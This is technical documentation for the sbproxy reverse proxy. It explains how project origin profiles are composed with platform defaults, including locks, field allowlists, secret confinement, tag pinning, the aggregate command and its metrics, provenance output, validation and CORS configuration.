- **An override of an unlocked entry that introduces an effect a lock above it already holds.** Merging replaces scalars, `type:` included, so a project matching an unlocked floor entry by name can rewrite it into a locked entry's mechanism, or make it write a locked header, without renaming or adding anything. Only the effects the merge introduced are compared, and only against locks the entry already sits after: the floor's own arrangement of two entries touching one thing is the platform's business, and an entry does not shadow a lock that comes later.

All three rules bind the project and only the project. The entry's `overrides:` block is the runtime config speaking to itself, so it passes through a lock and may bring a script into a locked list; it is layered last in any case.

The first rule is deliberately wider than the hazard: two policies of the same type do not always shadow each other, and a project that needs a second one of a locked type asks whoever owns `origin_defaults` to carry it. The alternative is a per-module table of which mechanisms compose, which nothing else in the tree maintains and which would be wrong the first time a module changed.

### What a project may set

A project may set exactly these origin fields:

`action`, `authentication`, `policies`, `transforms`, `request_modifiers`, `response_modifiers`, `cors`, `compression`, `error_pages`, `problem_details`, `deprecation`, `expose_openapi`, `agents_md`, `ai_txt`, `agents_json`, `agent_skills`, `default_content_shape`, `content_signal`, `token_bytes_ratio`.

Everything else on an origin is unrepresentable in a profile rather than merely rejected: there is no field that could hold it, so the parse fails and names the key. That is an allowlist on purpose. An origin has 52 fields and gains more regularly, so a deny list would make every future field a silent privilege grant to every project repository. A test enumerates the origin's fields and fails when one appears on neither side, and the failure says to classify it.

A deny list written today would already have missed `filters[].failure_posture` (a project flipping a platform security filter to fail-open while the config still advertises protection), `force_ssl: false`, `response_cache` (an authenticated response cached and served to somebody else), the `on_request` and `on_response` extension hooks, and `allowed_methods` (an empty list allows every method).

### Secrets in a profile

A profile is a confined document; see [Confined fragments](#confined-fragments). It cannot reach the composing host at all. `${VAR}` and `{{env.X}}` are refused, and so are `env:NAME`, `file:/path` and `vault://env/NAME`, along with every config key that names a host path the proxy opens.

The one secret spelling that survives is a provider URI such as `secret://prod/checkout-key`, which resolves only against a backend declared under `proxy.secrets`, a block no project can write.

A profile carrying a secret written out in full is refused, and the refusal names the field and the profile but never the value. The check runs after inputs are substituted, so an entry that binds a raw token is refused exactly as a profile that wrote one would be.

In practice the simplest answer is to keep credentials out of the profile entirely and put them in the entry's `overrides:` block. That block is ordinary runtime YAML, so `${VAR}` resolves there and every secret reference form works, and it is layered last, so nothing the project wrote can reach around it:

```yaml
origin_sources:
  entries:
    - name: checkout
      overrides:
        authentication:
          type: api_key
          header_name: X-Api-Key
          api_keys:
            - "${CHECKOUT_INBOUND_KEY}"
```

Note the direction of travel. An origin's `authentication:` block validates the callers of this service; it is not the credential the proxy presents to the upstream. The outbound credential is `credentials:` or `outbound_credential:`, both platform-owned and both unrepresentable in a profile.

### Pinning and the environment tier

In the `production` tier every entry must pin a full commit sha, or a tag spelled `refs/tags/v1.4.2`. A bare `v1.4.2` is refused, because git does not tell a tag from a branch by spelling and a rule that guessed would be a rule a branch could walk straight through.

The tier cannot come from the entry. An entry that wanted to track a branch would simply write `environment: dev`, and a self-declared constraint is not a constraint. The entry's `environment:` selects which profile layer applies, and nothing more.

### Two writers, one hostname

Two entries claiming the same map key is a named error, and so is an entry claiming a host that a hand-written `origins:` key already declares. Silent last-wins is the failure that check exists to prevent, and it is answered from the runtime document alone, so `sbproxy validate` catches it with nothing fetched.

Wildcard overlap is not a collision. An exact key beats a wildcard and the longest matching suffix wins between wildcards, all of which routing already settles, so the only question asked here is whether two writers claim the same map key.

### Operating it

`GET /admin/origin-composition` reports the declaration and its posture, read off the effective config:

```bash
curl -su admin:"$ADMIN_PASSWORD" http://127.0.0.1:9090/admin/origin-composition
```

```json
{
  "declared": true,
  "tier": "production",
  "entries": [
    {
      "name": "checkout",
      "repo": "https://git.example.com/acme/checkout",
      "revision": "refs/tags/v1.4.2",
      "pinned": true,
      "verify_signature": true,
      "credential": "reference",
      "hosts": { "api": ["checkout.example.com"] },
      "inputs": ["shop_origin", "upstream_host"]
    }
  ],
  "claimed_hosts": [
    { "host": "checkout.example.com", "entry": "checkout", "profile_origin": "api" }
  ],
  "collision": null
}
```

A repository URL is credential-stripped, an entry credential is reported as present or absent and never by value, and an input is reported by name only.

`sbproxy_origin_source_entries{tier,pinned}` carries the same two facts for alerting. The total dropping to zero means a fleet that should be composing project profiles has quietly stopped. A non-zero `pinned="false"` series under `tier="production"` means a node is running a document that predates the pinning rule, since config load refuses that combination outright.

### `sbproxy aggregate`: running the composition

```bash
# Compose the origins overlay and publish it through the config
# authority this document configures. The node's own `proxy:` block
# stays here; only `origins:` and `origin_defaults` travel.
sbproxy aggregate -f /etc/sbproxy/sb.yml

# Compose to a file instead, for a single node or a CI review step.
sbproxy aggregate -f /etc/sbproxy/sb.yml --out composed.yml

# Show what that file would change, and write nothing. Exit 2 on changes.
sbproxy aggregate -f /etc/sbproxy/sb.yml --out composed.yml --dry-run

# Why is this policy here.
sbproxy aggregate -f /etc/sbproxy/sb.yml --explain checkout.example.com
sbproxy plan -f /etc/sbproxy/sb.yml --explain-origin checkout.example.com

# Keep running: poll, coalesce a burst into one publish, publish on change.
sbproxy aggregate -f /etc/sbproxy/sb.yml --watch
```

One round fetches every entry, composes, and publishes only when the composed document differs from the last one published. A proxy that both declares `origin_sources` entries and publishes a config authority runs the same loop in process at boot, which is where the metrics below come from; a node with entries and no authority logs that it is not composing rather than doing it silently, because its answer is `--out` and that is an operator's decision.

Two documents come out of one composition, and they are not the same document.

**What `--out` writes** is the whole runtime document with its composition blocks replaced by the origins they produced. A single node boots that file unmodified, so it has to keep `proxy:`. It carries neither composition block: `origin_sources` because a composed output is not a source of further composition and re-composing one would loop, and `origin_defaults` because the floor is already folded into every composed origin.

**What gets published** is narrower: the `origins:` map (composed plus hand-written) and `origin_defaults`, and nothing else. It is built up rather than cut down, and that is the point. The node running the aggregator necessarily declares `proxy.config_authority`, and any entry with a `credential:` needs a `proxy.secrets` backend in the same file to resolve it against. Both are on the [subscriber-owned path list](#what-the-subscriber-owns-outright), so a payload assembled by removing keys from the runtime document is refused by the publish screen on every real configuration, and it would be the wrong thing to send even if it were not: a subscriber's listeners, TLS, admin surface and secrets are not the fleet's to set. `origin_defaults` rides along because it is deliberately not on that list; a subscriber's `GET /admin/origin-composition` then reports the floor its composed origins were built from. Nothing on a node re-applies it, because nothing on a node composes.

Anything else a platform team wants to distribute goes through `sbproxy config authority publish` with a payload it writes. This verb composes origins.

**A hand-written origin travels, so it has to be portable.** The `origins:` map the aggregator node writes by hand is published alongside the composed ones, and so is every entry's `overrides:` block. Both are checked at composition time with the same screen the config authority applies to any document that reaches a fleet: no key that names a file on this host (`spec_file`, `spec_path`, `module_path`, `rego_module_path`, `sha1_file`, and the rest of the [confined fragments](#confined-fragments) table), and no `env:`, `file:` or `vault://env/` value anywhere. Those are all legal on a node that owns its own filesystem and meaningless on the fifty that do not. A `${VAR}` reference is still fine and is the documented way to name a per-node value, because it resolves on the subscriber. Composition is refused with the offending key named, so `sbproxy aggregate`, `--out` and `--dry-run` all report it before a publish does. Carry the OpenAPI document inline under `spec`, the Rego module inline under `rego_module`, and the secret through a `secret://` or `vault://<backend>/` reference each subscriber resolves for itself.

A revision beginning with `refs/` takes a targeted `git init` plus shallow fetch rather than a clone, because `git clone --branch` takes a short name and refuses a full ref. That matters here more than anywhere else: `refs/tags/<name>` is the spelling a `production` tier requires. An annotated tag resolves to the commit a checkout reports, not to the tag object.

A composed origin is materialized **once per host**, so a profile bound to ten hosts is ten origins, and the size a signed bundle may carry (`MAX_CONFIG_YAML_BYTES`, 4 MiB) is a ceiling on hosts rather than on projects. The limit is checked against the published payload, since that is what gets signed. Measured against a realistic floor (a proxy action, three floor policies, one project policy, one response modifier) a composed origin is 435 bytes, so the ceiling is reached at roughly 9,600 hosts. Past it the composition is refused with a message naming the limit, how many origins materialized, and the mean bytes each; nothing is published.

Two failure classes are kept apart, deliberately. A single entry that will not fetch falls back to its last successfully resolved profile, is named in the output and counted on `sbproxy_aggregate_entries{outcome="failed"}`, and the other entries are unaffected: one unreachable repository must not discard forty-nine other projects' last-known-good. An entry that fails its **first** fetch has nothing to fall back on, and there the whole round is refused, because composing without it would publish an `origins:` map silently missing that project's hosts. A composed document that does not compile, does not construct, or names a denied path is refused at the authority and never published at all.

#### `origin_sources.aggregator`

```yaml
origin_sources:
  tier: production
  aggregator:
    poll_interval_secs: 120
    debounce_secs: 15
    max_deferral_secs: 120
    concurrency: 8
    deadline_secs: 300
  entries:
    - name: checkout
      # ...
```

| Key | Type | Default | Description |
|---|---|---|---|
| `poll_interval_secs` | int | `120` | How often each unpinned entry is asked whether its revision moved. One `git ls-remote` per unpinned entry per interval, so `3600 / poll_interval_secs` requests per hour per repository: **30 per hour per repository** at the default. An entry pinned to a full commit sha is polled zero times. |
| `debounce_secs` | int | `15` | How long a moved entry waits for others before the aggregator composes. Zero composes immediately. |
| `max_deferral_secs` | int | `120` | Ceiling on that wait, measured from the first movement in the window. Without it a continuously-changing entry would reset the debounce forever and never publish. |
| `concurrency` | int | `8` | How many repositories are fetched at once. |
| `deadline_secs` | int | `300` | Hard deadline for all of one round's fetches. Distinct from a per-entry `timeout_secs`, which bounds one repository. |

The defaults come from the state of the art rather than from taste. `poll_interval_secs: 120` is Argo CD's `--app-resync` default, which is the same job: the floor on how often a change is looked for. The debounce and its ceiling are the pair Argo CD reaches with its self-heal timeout, the floor on how often a change is acted on.

Polling is cheap because it does not clone. `git ls-remote <repo> <ref>` returns the sha for a reference in one network round trip with no working tree, and a clone only happens when that sha moved. Argo CD's repo-server resolves an ambiguous revision the same way and keys its manifest cache on the resolved commit, so an unchanged sha never reaches a checkout. Three reductions fall out: an entry pinned to a full commit sha is never polled, because a sha cannot move; two entries naming the same repository at the same revision are one fetch, which is what a monorepo deploying several services wants; and a round where nothing moved composes nothing, publishes nothing, and leaves every subscriber on its `304`.

Aggregation writes four metric families:

| Metric | Labels | What it says |
|---|---|---|
| `sbproxy_aggregate_entries` | `outcome` | Entries by how the last round ended: `resolved`, `unchanged`, `failed`. Every outcome is written on every round including the zeroes. |
| `sbproxy_aggregate_compose_duration_seconds` | none | Wall clock of one round, fetches included. |
| `sbproxy_aggregate_published_revision` | none | The config-authority revision last published. Zero means nothing has been. |
| `sbproxy_aggregate_rounds_total` | `outcome` | Rounds by decision: `published`, `unchanged`, `refused`. |

The entry name is deliberately not a label. Fifty entries would be fifty series that churn as the block is edited, and the entry that failed is named in the structured log, in the CLI output, and on `GET /admin/origin-composition`.

### Composition provenance

Once an origin is the product of four layers and two repositories, "why is this WAF rule here" has four possible answers and they lead to different people. `sbproxy aggregate --explain <host>` and `sbproxy plan --explain-origin <host>` name the layer for every leaf:

```
checkout.example.com
  action.url                         spec.base  entry checkout  https://git.example.com/acme/checkout@a1b2c3d4e5f6
  policies[platform_waf].action_on_match  origin_defaults
  policies[rate_limit].requests_per_minute  spec.environments[prod]  entry checkout  https://git.example.com/acme/checkout@a1b2c3d4e5f6
  policies[rate_limit].burst         origin_sources.entries[].overrides  entry checkout
  dropped policies[legacy_cap]  spec.base dropped a default introduced by origin_defaults  entry checkout
```

Four things about that output are deliberate.

The merged lists are keyed by `name:` rather than by index, because an index moves whenever an earlier entry is dropped or a project appends one, and an audit trail that renumbered itself between two composes would be worse than none.

A field-level override reports per field. The floor set `requests_per_minute` and `burst`; the project rewrote one and the runtime rewrote the other, and the field nobody touched still names the floor. Reporting per policy would credit one layer with all three and lose exactly the fact somebody needs.

A drop is recorded with both layers. `disabled: true` removing a default is precisely the thing somebody asks about later, and an absence explains nothing on its own, so the record names the layer that dropped it and the layer that had introduced it.

Nothing carries a value. Provenance says which layer set a leaf and which repository that layer came from; the leaf's value is in the composed document, which is the thing under access control. A composed leaf can be a `secret://backend/name` reference an entry bound, so carrying values here would put a reference into every surface that renders provenance, including a `plan` output somebody pastes into a ticket.

Kustomize is the closest published analogue and it stops one level short: `buildMetadata: [originAnnotations, transformerAnnotations]` writes `config.kubernetes.io/origin` (with `path`, `repo`, `ref`) and an `alpha.config.kubernetes.io/transformations` chain onto each resource, so it answers which file and which transformers produced a resource. It does not answer which layer set a field. A composed origin is one resource made of four layers, so per-resource attribution would collapse to a single answer, which is why the grain here is the leaf.

---

## Validation

Check the configuration for errors without starting the proxy:

```bash
sbproxy validate /etc/sbproxy/sb.yml
# or, equivalently, on a running --config invocation
sbproxy --config /etc/sbproxy/sb.yml --check
```

This catches:
- YAML syntax errors
- Missing required top-level fields
- Unknown action / policy / transform types

Validate every config change before deploying to production. Metrics are exposed via the embedded admin server: set `proxy.admin.enabled: true`, `proxy.admin.port: 9090`, and tune `proxy.metrics.max_cardinality_per_label` for high-traffic deployments.

For production deployments, the `sbproxy plan` and `sbproxy apply` subcommands give a Terraform-style diff-and-confirm path on top of `validate`: `plan -f` diffs a proposed config against a baseline (exit 0 no-op, 2 changes present, 3 semantic errors) and `apply` validates and reloads in place. See [manual.md](manual.md) for the full CLI reference.

---

## CORS

Configure Cross-Origin Resource Sharing as a top-level origin field:

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    cors:
      allowed_origins: ["https://app.example.com", "https://admin.example.com"]
      allowed_methods: [GET, POST, PUT, DELETE, OPTIONS]
      allowed_headers: [Content-Type, Authorization, X-Requested-With]
      expose_headers: [X-Request-ID, X-RateLimit-Remaining]
      max_age: 3600
      allow_credentials: true
```

The presence of the `cors:` block is what enables CORS header injection. Remove the block to disable CORS.

A legacy `enable` flag (alias `enabled`) still parses, and the runtime has never checked it. `enable: true` is accepted because it agrees with what the block already does. `enable: false` is refused at config compile, because it did not turn CORS off: a config that set it was serving CORS headers while reading as though it were not.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `allowed_origins` | list | | Allowed origins (use `["*"]` for any). Alias: `allow_origins`. An empty list is deny-all. |
| `allowed_methods` | list | standard methods | Allowed HTTP methods. Alias: `allow_methods`. |
| `allowed_headers` | list | standard headers | Allowed request headers. Alias: `allow_headers`. |
| `expose_headers` | list | | Headers exposed to the browser |
| `max_age` | int | | Preflight cache duration in seconds |
| `allow_credentials` | bool | false | Allow credentials (cookies, auth headers). Refused at config load in combination with `allowed_origins: ["*"]`. |
| `enable` | bool | unset | Legacy flag, alias `enabled`. Parsed but ignored at runtime. |

`allowed_origins: ["*"]` together with `allow_credentials: true` fails
config load. Browsers reject that pair per the Fetch standard, so the
proxy has always refused to emit any CORS header for it; refusing the
config instead means you find out at `sbproxy validate` rather than from
a browser console. Name the origins you mean, or drop
`allow_credentials`.

A preflight is an `OPTIONS` request carrying
`Access-Control-Request-Method`, which is what the Fetch standard
defines it as. A plain `OPTIONS` that carries only `Origin` is a normal
request and reaches the upstream, so an API that implements `OPTIONS`
itself (a discovery endpoint returning `Allow:`, or WebDAV) keeps
working when a `cors:` block is added in front of it.

---

## Quick reference: config field locations

A common mistake is nesting fields inside `action` when they should be siblings. The correct layout:

```yaml
origins:
  "api.example.com":
    # These are ALL at the same level (siblings of action):
    action: { ... }
    authentication: { ... }
    policies: [ ... ]
    transforms: [ ... ]
    request_modifiers: [ ... ]
    response_modifiers: [ ... ]
    forward_rules: [ ... ]
    response_cache: { ... }
    variables: { ... }
    session: { ... }
    cors: { ... }
    compression: { ... }
    hsts: { ... }
    mirror: { ... }                # shadow traffic; sibling of action
    on_request: [ ... ]            # webhook callbacks
    on_response: [ ... ]
    extensions: { ... }
```

None of these belong inside the `action` block. The `action` block only contains action-specific fields (type, url, targets, providers, etc.).

A handful of fields *do* live inside an action because they govern how the proxy talks to that specific upstream:

```yaml
action:
  type: proxy
  url: https://upstream.example/api
  host_override: api.upstream.example       # rewrite the upstream Host
  disable_via_header: true                  # any of the disable_*_header flags
  retry: { ... }                            # upstream retry policy
```

`load_balancer` actions accept an `outlier_detection` block at the action level and per-target `health_check`, `host_override`, and `disable_*_header` flags inside each target.

## Environment variable templating in header modifiers

Request and response header modifiers may reference environment variables with
`{{env.NAME}}`. Resolution has two stages:

1. While compiling the origin, the stock binary replaces the template when
   `NAME` is set in the process environment.
2. If `NAME` is unset, the literal template reaches the request-time header
   modifier. Its `TemplateContext` has an empty environment allowlist in the
   stock runtime, so the unresolved `{{env.NAME}}` becomes an empty string and
   emits a warning.

There is no configuration field or command-line option for populating that
runtime allowlist. A missing environment variable can therefore produce an
empty request or response header.

```yaml
request_modifiers:
  - headers:
      set:
        X-Build-Id: "{{env.SBPROXY_BUILD_ID}}"
        X-Region:   "{{env.SBPROXY_REGION}}"
```

Only trusted operators should be able to edit configuration that uses this
form because a value resolved during compilation can be sent to an upstream.
Use the secret reference backends for credentials instead of copying secrets
into headers. A config fragment authored outside the runtime config repo is
not a trusted operator, and `{{env.NAME}}` is refused there rather than
resolved; see [Confined fragments](#confined-fragments).
